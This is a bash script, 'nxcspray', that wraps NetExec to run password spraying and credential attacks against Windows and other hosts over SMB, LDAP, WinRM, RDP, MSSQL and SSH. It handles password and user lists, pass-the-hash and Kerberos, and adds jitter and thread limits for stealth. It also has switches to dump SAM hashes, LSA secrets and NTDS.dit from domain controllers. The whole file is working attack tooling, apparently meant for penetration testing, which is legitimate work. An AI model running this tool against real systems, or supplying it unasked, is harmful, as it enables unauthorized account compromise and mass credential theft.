#!/bin/bash

# nxcspray - NetExec (nxc) spraying / enumeration wrapper
#
# Runs one nxc invocation per protocol against a target (or target file),
# forwarding a rich set of auth options and passing through any raw nxc flag.
#
# Usage:
#   nxcspray <protocols|all> <targets> [auth] [spray-safety] [dump toggles] [-- <raw nxc args>]
#
# Auth (choose a secret: -p, -H, or -k):
#   -u <user|file>      Username or username file
#   -p <pass|file>      Password or password file
#   -H <hash>           NTLM hash (LM:NT or NT) for pass-the-hash
#   -d <domain>         Domain
#   --local-auth        Authenticate locally to each host
#   -k                  Use Kerberos auth
#   --aes-key <key>     AES key for Kerberos
#
# Spray safety:
#   --continue-on-success   Keep going after the first valid cred on a host
#   --no-bruteforce         Pair user/pass lines 1:1  instead of trying every 
#                           combination of user/pass
#   --jitter <s|s-s>        Delay between attempts, e.g. 5 or 1-3
#   -t <n>                  Threads (default nxc = 100; lower to go quiet)
#
# SMB-only dump/enum toggles (auto-skipped on non-SMB protocols):
#   --sam        Dump local SAM hashes
#   --lsa        Dump LSA secrets
#   --ntds       Dump NTDS.dit (DC only, VERY loud)
#   --shares     Enumerate shares
#   --enum       Bundle: --users --groups --loggedon-users --sessions --pass-pol
#
# Passthrough:
#   Everything after a literal --  is appended verbatim to every nxc call,
#   e.g.  -- -M spider_plus -o READ_ONLY=true
#
# Other:
#   --dry-run    Print the nxc commands without executing them
#   -h, --help   Show this help
#
# Examples:
#   nxcspray smb 10.10.10.10 -u bob -p 'Winter2026!'
#   nxcspray all hosts.txt -u users.txt -p 'Spring2026!' --continue-on-success --jitter 2-5
#   nxcspray smb 10.0.0.0/24 -u administrator -H aad3b...:31d6c... --local-auth --sam --lsa
#   nxcspray smb dc01.corp.local -u svc -p Pass1 -d corp.local -- -M ntdsutil

set -o pipefail

# ---- Help ----
usage() {
    sed -n '3,55p' "$0" | sed 's/^#\{0,1\} \{0,1\}//'
    exit "${1:-0}"
}

# ---- Positional Args ----
if [ "$#" -lt 2 ]; then
    echo "[-] Usage: $0 <protocols|all> <targets> -u <user> {-p <pass>|-H <hash>|-k} [options]" >&2
    echo "[-]        $0 --help  for the full option list" >&2
    exit 1
fi

case "$1" in -h|--help) usage 0 ;; esac

PROTOS_RAW="$1"
TARGETS_RAW="$2"
shift 2

# ---- Defaults / accumulators ----
USER=""
SECRET_SET=0            # tracks whether a password/hash/kerberos secret was given

AUTH_ARGS=()            # applied to every protocol
SMB_ARGS=()             # appended only when PROTO == smb
PASSTHRU=()             # everything after `--`
DRY_RUN=0

# ---- Flag Parsing (manual: supports long options + passthrough) ----
while [ "$#" -gt 0 ]; do
    case "$1" in
        # --- auth ---
        -u) USER="$2"; AUTH_ARGS+=( -u "$2" ); shift 2 ;;
        -p) SECRET_SET=1; AUTH_ARGS+=( -p "$2" ); shift 2 ;;
        -H) SECRET_SET=1; AUTH_ARGS+=( -H "$2" ); shift 2 ;;
        -d) AUTH_ARGS+=( -d "$2" ); shift 2 ;;
        --local-auth) AUTH_ARGS+=( --local-auth ); shift ;;
        -k) SECRET_SET=1; AUTH_ARGS+=( -k ); shift ;;
        --aes-key) SECRET_SET=1; AUTH_ARGS+=( --aesKey "$2" ); shift 2 ;;

        # --- spray safety ---
        --continue-on-success) AUTH_ARGS+=( --continue-on-success ); shift ;;
        --no-bruteforce) AUTH_ARGS+=( --no-bruteforce ); shift ;;
        --jitter) AUTH_ARGS+=( --jitter "$2" ); shift 2 ;;
        -t) AUTH_ARGS+=( -t "$2" ); shift 2 ;;

        # --- SMB-only dump / enum ---
        --sam) SMB_ARGS+=( --sam ); shift ;;
        --lsa) SMB_ARGS+=( --lsa ); shift ;;
        --ntds) SMB_ARGS+=( --ntds ); shift ;;
        --shares) SMB_ARGS+=( --shares ); shift ;;
        --enum) SMB_ARGS+=( --users --groups --loggedon-users --sessions --pass-pol ); shift ;;

        # --- wrapper controls ---
        --dry-run) DRY_RUN=1; shift ;;
        -h|--help) usage 0 ;;

        # --- raw passthrough: everything after `--` ---
        --) shift; PASSTHRU=( "$@" ); break ;;

        *) echo "[-] Unknown flag: $1  (use -- to pass raw nxc args)" >&2; exit 1 ;;
    esac
done

# ---- Validation ----
if [ -z "$USER" ]; then
    echo "[-] Missing required flag: -u <user|file>" >&2
    exit 1
fi
if [ "$SECRET_SET" -eq 0 ]; then
    echo "[-] Missing required flag: provide -p <pass>, -H <hash>, or -k (Kerberos)" >&2
    exit 1
fi

# ---- Protocol Handling ----
if [ "$PROTOS_RAW" = "all" ]; then
    PROTO_ARRAY=(smb ldap winrm rdp mssql ssh)
else
    IFS=',' read -ra PROTO_ARRAY <<< "$PROTOS_RAW"
fi

# ---- Target Handling ----
# nxc natively accepts an IP, range, CIDR, or a file path as the target, and
# threads across them itself.
TARGET_ARG="$TARGETS_RAW"

# Warn if SMB-only toggles were requested but SMB isn't in the run.
if [ "${#SMB_ARGS[@]}" -gt 0 ]; then
    case " ${PROTO_ARRAY[*]} " in
        *" smb "*) : ;;
        *) echo "[!] SMB-only toggles (${SMB_ARGS[*]}) requested but 'smb' is not in the protocol list — they will be skipped." >&2 ;;
    esac
fi

# ---- Spray Loop ----
for PROTO in "${PROTO_ARRAY[@]}"; do
    echo "[+] Protocol: $PROTO"

    CMD=( nxc "$PROTO" "$TARGET_ARG" "${AUTH_ARGS[@]}" )

    # Only append dump/enum toggles for SMB.
    if [ "$PROTO" = "smb" ] && [ "${#SMB_ARGS[@]}" -gt 0 ]; then
        CMD+=( "${SMB_ARGS[@]}" )
    fi

    # Raw passthrough applies to every protocol.
    if [ "${#PASSTHRU[@]}" -gt 0 ]; then
        CMD+=( "${PASSTHRU[@]}" )
    fi

    echo "    -> ${CMD[*]}"
    if [ "$DRY_RUN" -eq 0 ]; then
        "${CMD[@]}"
    fi
    echo
done
